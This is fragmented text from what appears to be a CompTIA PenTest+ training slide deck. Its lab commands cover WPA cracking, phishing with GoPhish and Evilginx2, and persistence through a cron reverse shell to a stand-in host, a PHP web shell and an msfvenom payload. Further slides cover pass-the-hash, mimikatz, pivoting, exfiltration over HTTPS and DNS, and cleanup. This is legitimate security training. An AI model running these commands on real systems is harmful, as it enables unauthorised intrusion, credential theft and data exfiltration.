wlan0mon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332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Wireless Attacks: WPA Cracking wit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Wireless Attacks: WPA Cracking with Aircrack-ng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Crack the handshake with aircrack-ng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aircrack-ng -w /usr/share/wordlists/rockyou.txt -b &lt;BSSID&gt; cap-01.cap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333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Wireless Attacks: WPA Cracking wit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Wireless Attacks: WPA Cracking with Aircrack-ng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Convert and GPU-crack with hashcat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hcxpcapngtool -o handshake.hc22000 cap-01.cap; hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt -r best64.rule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334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Wireless Attacks: WPA Cracking wit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Wireless Attacks: WPA Cracking with Aircrack-ng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Capture a client-less PMKID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hcxdumptool -i wlan0mon -w pmkid.pcapng --enable_status=1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335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Wireless Attacks: WPA Cracking wit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Wireless Attacks: WPA Cracking with Aircrack-ng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Scan for and brute-force a WPS PIN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reaver -i wlan0mon -b &lt;BSSID&gt; -c &lt;CH&gt; -vv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336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Wireless Attacks: WPA Cracking with Aircrack-ng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aircrack-ng or hashcat recovers the WPA2 passphrase from the capture file.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337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Social Engineering with GoPhish and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runs a controlled GoPhish phishing campaign against a test mailbox and clones a login page with SET.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phishing campaign with a cloned landing page and captured credential submissions.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GoPhish, SET (setoolkit), MailHog, Evilginx2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338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Social Engineering with GoPhish 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Social Engineering with GoPhish and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and start the GoPhish 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gophish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339</a:t>
            </a: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Social Engineering with GoPhish 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Social Engineering with GoPhish and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a MailHog catcher for the sending profile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docker run --rm -d --name mh -p 1025:1025 -p 8025:8025 mailhog/mailhog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340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Social Engineering with GoPhish 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Social Engineering with GoPhish and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Clone a real login page as the landing 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341</a:t>
            </a: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Social Engineering with GoPhish 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Social Engineering with GoPhish and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Author a spear-phish email template with merge tags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342</a:t>
            </a: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Social Engineering with GoPhish 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Social Engineering with GoPhish and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Import target users from CSV and launch the campaign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343</a:t>
            </a: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Social Engineering with GoPhish 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Social Engineering with GoPhish and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Clone a login with the SET credential harvester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setoolkit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344</a:t>
            </a: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Social Engineering with GoPhish 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Social Engineering with GoPhish and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Deploy Evilginx2 to capture MFA session cookies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evilginx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345</a:t>
            </a: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Social Engineering with GoPhish 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Social Engineering with GoPhish and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the campaign click and submit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346</a:t>
            </a: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Social Engineering with GoPhish and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GoPhish dashboard shows Sent, Opened, Clicked and Submitted Data for the campaign.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347</a:t>
            </a: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Attacks and Exploits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4.1 Capability selection; 4.2 Network attacks with Metasploit; 4.10 Scripting and BAS.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4.1 Establish bind and reverse shells; 4.2 Command execution and shell handling; 4.4 Upgrade to a fully interactive TTY.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4.2 On-path attack, Relay attack, Responder; 4.3 Pass-the-hash.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4.3 Dictionary, brute-force, password spraying, credential stuffing.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4.3 Brute force, dictionary, mask, password spraying — offline tools hashcat and John the Ripper.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4.4 Privilege escalation, credential dumping, misconfigured endpoints, LOLbins, shell escape.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348</a:t>
            </a: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Post-exploitation and Lateral Movement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Persistence · CrackMapExec &amp; Impacket · Pivoting · Exfiltration · Cleanup &amp; Preservation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349</a:t>
            </a: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14%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Post-exploitation and Lateral Movement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Persistence keeps access across reboots (cron, systemd services, web shells, scheduled tasks) and demonstrates the real risk of an initial compromise.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Lateral movement reuses captured credentials and hashes (CrackMapExec, Impacket pass-the-hash) to move from one host to the next across a network.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Pivoting and tunnelling (sshuttle, Chisel, Proxychains) reach otherwise-unreachable internal segments; exfiltration testing (DNS, ICMP, HTTPS) validates data-loss controls.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Professional engagements end with cleanup: remove tooling and persistence, restore changed state, and preserve artifacts and evidence for the report.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350</a:t>
            </a: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Post-exploitation and Lateral Movement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33–34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Establishing Persistence (cron, systemd, web shell)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Lateral Movement with CrackMapExec and Impacket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35–36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Pivoting with sshuttle, Chisel and Proxychains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Data Exfiltration over DNS, ICMP and HTTPS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37–37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Cleanup, Restoration and Artifact Preservation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351</a:t>
            </a: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Establishing Persistence (cron, systemd, web shell)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establishes and documents multiple persistence mechanisms on a compromised host — a cron job, a systemd service, an authorized SSH key, a PHP web shell and a generated payload.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set of documented persistence artefacts (cron, systemd, SSH key, web shell, payload) on the compromised host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cron, systemd, OpenSSH, weevely, msfvenom, netcat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352</a:t>
            </a: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Establishing Persistence (cron, sy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Establishing Persistence (cron, systemd, web shell)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a cron-based reverse-shell backdoor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'* * * * * root bash -c "bash -i &gt;&amp; /dev/tcp/&lt;KALI&gt;/4444 0&gt;&amp;1"' | sudo tee /etc/cron.d/sysupdate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353</a:t>
            </a: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Establishing Persistence (cron, sy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Establishing Persistence (cron, systemd, web shell)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Catch the callback with a netcat listener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nc -lvnp 4444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354</a:t>
            </a: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Establishing Persistence (cron, sy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Establishing Persistence (cron, systemd, web shell)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systemd service that reconnects on boot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systemctl enable --now sys-helper.service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355</a:t>
            </a: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Establishing Persistence (cron, sy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Establishing Persistence (cron, systemd, web shell)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an attacker SSH key for key-based access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'ssh-ed25519 AAAA...  attacker@kali' &gt;&gt; /root/.ssh/authorized_keys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356</a:t>
            </a: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Establishing Persistence (cron, sy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Establishing Persistence (cron, systemd, web shell)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Drop a PHP web shell into the web root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tee /var/www/html/.cache.php &lt;&lt;&lt; '&lt;?php if(isset($_REQUEST["c"])) system($_REQUEST["c"]); ?&gt;'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357</a:t>
            </a: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Establishing Persistence (cron, sy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Establishing Persistence (cron, systemd, web shell)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a stealthier web shell with weevely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weevely generate Spring2026 /tmp/sh.php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358</a:t>
            </a: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Establishing Persistence (cron, sy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Establishing Persistence (cron, systemd, web shell)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a Windows meterpreter payload with msfvenom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msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f exe -o agent.exe -e x64/xor -i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359</a:t>
            </a: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Establishing Persistence (cron, sy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Establishing Persistence (cron, systemd, web shell)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Document every persistence artefact for cleanup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360</a:t>
            </a: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Establishing Persistence (cron, systemd, web shell)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Confirm each persistence mechanism triggers a callback or shell, and that every artefact is recorded in your persistence inventory so it can be removed during cleanup.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361</a:t>
            </a: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Lateral Movement with CrackMapExec and Impacket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uses captured credentials to enumerate and execute commands across a Windows network, dumps further credentials, and moves laterally with pass-the-hash and pass-the-ticket.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Command execution and interactive shells on additional hosts reached with reused credentials and hashes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CrackMapExec, Impacket (psexec/wmiexec/atexec), evil-winrm, mimikatz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362</a:t>
            </a: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34 · Lateral Movement with CrackMapExec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Lateral Movement with CrackMapExec and Impacket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Sweep the subnet for SMB hosts with CrackMapExec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crackmapexec smb 10.0.0.0/24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363</a:t>
            </a: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34 · Lateral Movement with CrackMapExec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Lateral Movement with CrackMapExec and Impacket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Spray a known credential and enumerate shares/users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crackmapexec smb &lt;ip&gt; -u svc_sql -p 'Summer2025' --shares --users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364</a:t>
            </a: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34 · Lateral Movement with CrackMapExec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Lateral Movement with CrackMapExec and Impacket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Execute a command over SMB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crackmapexec smb &lt;ip&gt; -u svc_sql -p 'Summer2025' -x 'whoami /all'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365</a:t>
            </a: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34 · Lateral Movement with CrackMapExec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Lateral Movement with CrackMapExec and Impacket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Get an interactive shell with Impacket PsExec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impacket-psexec corp.local/svc_sql:Summer2025@&lt;ip&gt;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366</a:t>
            </a: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34 · Lateral Movement with CrackMapExec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Lateral Movement with CrackMapExec and Impacket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Get a shell over WinRM with evil-winrm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evil-winrm -i &lt;ip&gt; -u svc_sql -p 'Summer2025'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367</a:t>
            </a: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34 · Lateral Movement with CrackMapExec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Lateral Movement with CrackMapExec and Impacket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Dump credentials from the new host with mimikatz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sekurlsa::logonpasswords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368</a:t>
            </a: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34 · Lateral Movement with CrackMapExec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Lateral Movement with CrackMapExec and Impacket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Reuse an NT hash with pass-the-hash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impacket-psexec -hashes :&lt;NT-hash&gt; corp.local/Administrator@&lt;ip&gt;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369</a:t>
            </a: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34 · Lateral Movement with CrackMapExec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Lateral Movement with CrackMapExec and Impacket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Reuse a Kerberos ticket with pass-the-ticket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export KRB5CCNAME=ticket.ccache; impacket-psexec -k -no-pass corp.local/svc_sql@target.corp.local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370</a:t>
            </a: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Lateral Movement with CrackMapExec and Impacket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Verify you can execute commands and open shells on at least one additional host using reused credentials, hashes and tickets, and that each hop is logged in your engagement notes.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371</a:t>
            </a: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Pivoting with sshuttle, Chisel and Proxychains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turns a single compromised pivot host into a route to an internal network using SSH SOCKS, sshuttle, Chisel, port forwarding and Metasploit autoroute.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Working SOCKS and tunnelled routes from Kali into the internal 10.10.10.0/24 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OpenSSH, sshuttle, Chisel, Proxychains, Metasploit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372</a:t>
            </a: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35 · Pivoting with sshuttle, Chisel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Pivoting with sshuttle, Chisel and Proxychains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Open an SSH dynamic SOCKS proxy through the pivot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ssh -D 1080 -N user@pivot &amp;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373</a:t>
            </a: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35 · Pivoting with sshuttle, Chisel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Pivoting with sshuttle, Chisel and Proxychains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Route tools through the proxy with Proxychains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proxychains4 nmap -sT -Pn -p 22,80,445 10.10.10.0/24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374</a:t>
            </a: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35 · Pivoting with sshuttle, Chisel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Pivoting with sshuttle, Chisel and Proxychains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a transparent VPN over SSH with sshuttle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sshuttle -r user@pivot 10.10.10.0/24 --dns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375</a:t>
            </a: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35 · Pivoting with sshuttle, Chisel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Pivoting with sshuttle, Chisel and Proxychains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Start a Chisel reverse SOCKS tunnel when SSH is absent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chisel server -p 8443 --reverse &amp;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376</a:t>
            </a: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35 · Pivoting with sshuttle, Chisel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Pivoting with sshuttle, Chisel and Proxychains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Forward an internal RDP port over Chisel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./chisel client kali:8443 R:3389:10.10.10.5:3389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377</a:t>
            </a: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35 · Pivoting with sshuttle, Chisel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Pivoting with sshuttle, Chisel and Proxychains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Metasploit autoroute and port forward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run autoroute -s 10.10.10.0/24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378</a:t>
            </a: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35 · Pivoting with sshuttle, Chisel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Pivoting with sshuttle, Chisel and Proxychains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how a defender detects the pivot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379</a:t>
            </a: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Pivoting with sshuttle, Chisel and Proxychains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Confirm you can reach and interact with an internal host (e.g. 10.10.10.5) from Kali through at least two different tunnelling methods.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380</a:t>
            </a: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Exfiltration over DNS, ICMP and HTTPS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stages and encrypts collected data, then tests exfiltration over HTTPS, DNS and ICMP covert channels and reviews how each is detected.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Encrypted loot exfiltrated to a Kali receiver over HTTPS, DNS and ICMP channels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OpenSSL, tar, curl, iodine, ptunnel, scapy, tcpdump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381</a:t>
            </a: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36 · Data Exfiltration over DNS, ICMP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Exfiltration over DNS, ICMP and HTTPS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Stage and compress the collected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tar czf /tmp/.stage.tgz -C /tmp/.stage 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382</a:t>
            </a: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36 · Data Exfiltration over DNS, ICMP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Exfiltration over DNS, ICMP and HTTPS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Encrypt the archive with AES-256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enc -aes-256-cbc -pbkdf2 -in /tmp/.stage.tgz -out /tmp/.stage.enc -k 'Spring2026!'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383</a:t>
            </a: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36 · Data Exfiltration over DNS, ICMP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Exfiltration over DNS, ICMP and HTTPS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Exfiltrate over HTTPS to a Kali receiver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-k -X POST --data-binary @/tmp/.stage.enc https://&lt;KALI&gt;:8443/upload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384</a:t>
            </a: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36 · Data Exfiltration over DNS, ICMP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Exfiltration over DNS, ICMP and HTTPS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Tunnel data over DNS with iodine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iodine -P 'lab' tun.example.com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385</a:t>
            </a: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36 · Data Exfiltration over DNS, ICMP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Exfiltration over DNS, ICMP and HTTPS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Exfiltrate chunks encoded in DNS queries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base64 /tmp/.stage.enc | fold -w63 | nl | while read i c; do dig "$i.$c.exfil.example.com" @&lt;KALI&gt; +short;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386</a:t>
            </a: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36 · Data Exfiltration over DNS, ICMP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Exfiltration over DNS, ICMP and HTTPS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Tunnel over ICMP with ptunnel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ptunnel -p &lt;KALI&gt; -lp 2222 -da &lt;KALI&gt; -dp 22 -x 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387</a:t>
            </a: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36 · Data Exfiltration over DNS, ICMP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Exfiltration over DNS, ICMP and HTTPS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Capture ICMP exfil for reconstruction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tcpdump -i eth0 -w icmp.pcap 'icmp'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388</a:t>
            </a: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36 · Data Exfiltration over DNS, ICMP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Exfiltration over DNS, ICMP and HTTPS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detection and mitigation of covert channels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389</a:t>
            </a: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Exfiltration over DNS, ICMP and HTTPS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Verify the encrypted archive arrives intact over each channel (HTTPS, DNS, ICMP) and note which channels the monitoring controls did or did not detect.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390</a:t>
            </a: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Cleanup, Restoration and Artifact Preservation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inventories every change made during the engagement, removes persistence, credentials and tools, restores configuration, spins down infrastructure and preserves artifacts securely.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cleaned-up target environment plus an encrypted, hashed artifact archive with a signed acceptance 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systemd, cron, AWS CLI, Docker, Terraform, gpg, sha256sum, shred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391</a:t>
            </a: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37 · Cleanup, Restoration and Artifact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Cleanup, Restoration and Artifact Preservation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a full inventory of engagement artefacts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392</a:t>
            </a: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37 · Cleanup, Restoration and Artifact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Cleanup, Restoration and Artifact Preservation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Remove cron, systemd and web-shell persistence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rm /etc/cron.d/sysupdate; sudo systemctl disable --now sys-helper.service; sudo rm /var/www/html/.cache.php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393</a:t>
            </a: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37 · Cleanup, Restoration and Artifact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Cleanup, Restoration and Artifact Preservation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Remove tester-created credentials and accounts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userdel -r pt-backup; aws iam delete-access-key --user-name cg-starter --access-key-id AKIA...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394</a:t>
            </a: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37 · Cleanup, Restoration and Artifact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Cleanup, Restoration and Artifact Preservation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Remove uploaded tools and staged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rm -f /tmp/linpeas.sh /tmp/pspy /tmp/.stage.enc /tmp/.stage.tgz; sudo rm -rf /tmp/.stage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395</a:t>
            </a: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37 · Cleanup, Restoration and Artifact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Cleanup, Restoration and Artifact Preservation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Revert configuration changes to their original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396</a:t>
            </a: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37 · Cleanup, Restoration and Artifact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Cleanup, Restoration and Artifact Preservation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Spin down lab and cloud infrastructure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cd cloudgoat &amp;&amp; ./cloudgoat.py destroy &lt;scenario&gt;; sudo docker rm -f $(sudo docker ps -aq)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397</a:t>
            </a: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37 · Cleanup, Restoration and Artifact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Cleanup, Restoration and Artifact Preservation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Preserve artefacts with encryption and a hash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tar cJf acme-engagement.tar.xz .; gpg --symmetric --cipher-algo AES256 acme-engagement.tar.xz; sha256sum acme-engagement.tar.xz.gpg &gt; acme.sha256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398</a:t>
            </a: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37 · Cleanup, Restoration and Artifact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Cleanup, Restoration and Artifact Preservation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Securely destroy working copies of client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shred -vfz -n 5 acme-engagement.tar.xz.gpg; aws s3 rm s3://acme-loot --recursive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399</a:t>
            </a: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37 · Cleanup, Restoration and Artifact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Cleanup, Restoration and Artifact Preservation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Complete and sign the final acceptance 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400</a:t>
            </a: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Cleanup, Restoration and Artifact Preservation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Confirm every persistence mechanism, credential and tool from the inventory is removed, systems are restored, and the artifact archive is encrypted, hashed and recorded with chain of custody.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401</a:t>
            </a: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Post-exploitation and Lateral Movement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Establish persistence with scheduled tasks, services, backdoors and C2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Move laterally using captured credentials and hashes across SMB, WMI and WinRM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Pivot and tunnel into internal segments unreachable from the attacker host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Stage and exfiltrate data over covert channels to test data-loss controls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Clean up, restore systems and preserve artifacts with chain of custody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402</a:t>
            </a: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403</a:t>
            </a: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Engagement Management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Scoped engagements with SoW/NDA/RoE, threat models, ATT&amp;CK, CVSS and reports.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Recon &amp; Enumeration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Ran OSINT, DNS/subdomain, Shodan/Censys, Nmap, NSE and web enumeration.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Vulnerability Analysis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Scanned with OpenVAS, Nikto/ZAP, Trivy/Grype and TruffleHog; validated findings.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Attacks &amp; Exploits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Exploited hosts, credentials, web, cloud, wireless and people; escalated privilege.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Post-Exploitation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Established persistence, moved laterally, pivoted, exfiltrated and cleaned up.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404</a:t>
            </a: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Preparing for the PT0-003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Redo every lab from memory until the tool workflow and flags are automatic.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Review the 'What you learned' bullets in each lab and the Learner Guide.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Practise mapping findings to CVSS scores, CWE weaknesses and MITRE ATT&amp;CK techniques.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Take the free CompTIA practice assessment for PT0-003.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Book the exam via a Pearson VUE test centre or online proctoring.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405</a:t>
            </a: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852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23317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50" b="1">
                <a:solidFill>
                  <a:srgbClr val="2563EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>PRACTICE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96926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Arial"/>
              </a:rPr>
              <a:t>Take the Online PenTest+ Practice Exams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561320" cy="27432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1847088"/>
            <a:ext cx="54864" cy="548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388620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50" b="0">
                <a:solidFill>
                  <a:srgbClr val="111827"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Practise all five PT0-003 domains before exam day.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2304288"/>
            <a:ext cx="54864" cy="548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212848"/>
            <a:ext cx="388620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50" b="0">
                <a:solidFill>
                  <a:srgbClr val="111827"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Use timed attempts to build speed and confidence.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2761488"/>
            <a:ext cx="54864" cy="548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670048"/>
            <a:ext cx="388620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50" b="0">
                <a:solidFill>
                  <a:srgbClr val="111827"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Review explanations, then revisit the matching labs.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3218688"/>
            <a:ext cx="54864" cy="548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388620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50" b="0">
                <a:solidFill>
                  <a:srgbClr val="111827"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Start with the free teaser; sign in for the full bundle.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85615"/>
            <a:ext cx="292608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Arial"/>
              </a:rPr>
              <a:t>Sign up and practise at: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87368"/>
            <a:ext cx="406908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200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1650" b="1">
                <a:solidFill>
                  <a:srgbClr val="2563EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>exams.tertiaryinfotech.com/practice-</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1650" b="1">
                <a:solidFill>
                  <a:srgbClr val="2563EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>exams/comptia/comptia-pentest-plus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4960" y="1664208"/>
            <a:ext cx="562356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94960" y="1664208"/>
            <a:ext cx="562356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577840" y="1801368"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1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28132" y="1819656"/>
            <a:ext cx="91440" cy="91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33872" y="1810512"/>
            <a:ext cx="1325880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1">
                <a:solidFill>
                  <a:srgbClr val="111827"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Tertiary Exams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1819656"/>
            <a:ext cx="2057400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20" b="1">
                <a:solidFill>
                  <a:srgbClr val="374151"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Practice Exams     Vendors     FAQ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21824" y="1773936"/>
            <a:ext cx="749808" cy="25603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67544" y="1819656"/>
            <a:ext cx="658368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Get started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42432" y="2359152"/>
            <a:ext cx="1920240" cy="137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80" b="1">
                <a:solidFill>
                  <a:srgbClr val="2563EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>All exams / CompTIA / PenTest+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42432" y="2624328"/>
            <a:ext cx="3474720" cy="2468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Arial"/>
              </a:rPr>
              <a:t>CompTIA PenTest+ (PT0-003)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42432" y="2962656"/>
            <a:ext cx="3493008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200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="840" b="0">
                <a:solidFill>
                  <a:srgbClr val="374151"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Practice questions for engagement management, recon,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="840" b="0">
                <a:solidFill>
                  <a:srgbClr val="374151"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>vulnerability analysis, attacks and post-exploitation.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42432" y="3566160"/>
            <a:ext cx="1444752" cy="4754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70448" y="3648456"/>
            <a:ext cx="1188720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rial"/>
              </a:rPr>
              <a:t>MODE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70448" y="3803904"/>
            <a:ext cx="11887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1">
                <a:solidFill>
                  <a:srgbClr val="2563EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>2 Modes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70064" y="3566160"/>
            <a:ext cx="1444752" cy="4754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0" y="3648456"/>
            <a:ext cx="1188720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rial"/>
              </a:rPr>
              <a:t>COVERAGE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0" y="3803904"/>
            <a:ext cx="11887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1">
                <a:solidFill>
                  <a:srgbClr val="2563EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>5 Domains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97696" y="3566160"/>
            <a:ext cx="1325880" cy="4754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25712" y="3648456"/>
            <a:ext cx="1069848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rial"/>
              </a:rPr>
              <a:t>COST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25712" y="3803904"/>
            <a:ext cx="1069848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1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Free Teaser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742432" y="4315968"/>
            <a:ext cx="3218688" cy="10241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97880" y="4480560"/>
            <a:ext cx="1828800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rial"/>
              </a:rPr>
              <a:t>Domains covered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7880" y="4754880"/>
            <a:ext cx="2743200" cy="4754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200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="840" b="0">
                <a:solidFill>
                  <a:srgbClr val="374151"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Engagement  •  Recon</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="840" b="0">
                <a:solidFill>
                  <a:srgbClr val="374151"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Vulnerability Analysis  •  Attacks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="840" b="0">
                <a:solidFill>
                  <a:srgbClr val="374151"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Post-exploitation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25712" y="4315968"/>
            <a:ext cx="1325880" cy="10241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72016" y="4480560"/>
            <a:ext cx="868680" cy="137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19" b="1">
                <a:solidFill>
                  <a:srgbClr val="2563EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>FREE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72016" y="4663440"/>
            <a:ext cx="960120" cy="17373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rial"/>
              </a:rPr>
              <a:t>Try a teaser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72016" y="5001768"/>
            <a:ext cx="1005840" cy="2286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08592" y="5056632"/>
            <a:ext cx="932688" cy="822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Start exam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46520"/>
            <a:ext cx="39319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0">
                <a:solidFill>
                  <a:srgbClr val="374151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6446520"/>
            <a:ext cx="2926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900" b="0">
                <a:solidFill>
                  <a:srgbClr val="374151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52760" y="6446520"/>
            <a:ext cx="54864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00" b="1">
                <a:solidFill>
                  <a:srgbClr val="374151"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>406</a:t>
            </a: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(SAQ) — 1 hour.  Practical Performance (PP) — 1 hour.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Open book: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Remember to take the Assessment digital attendance (TRAQOM).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Submit your completed answers on the LMS at https://lms-tms.tertiaryinfotech.com/.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407</a:t>
            </a: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408</a:t>
            </a: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409</a:t>
            </a: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HAPPY (ETHICAL) HACKING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are now ready to plan and run a penetration test — and to sit the CompTIA PenTest+ (PT0-003) exam.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PenTest+ (PT0-003)  ·  TGS-2024044563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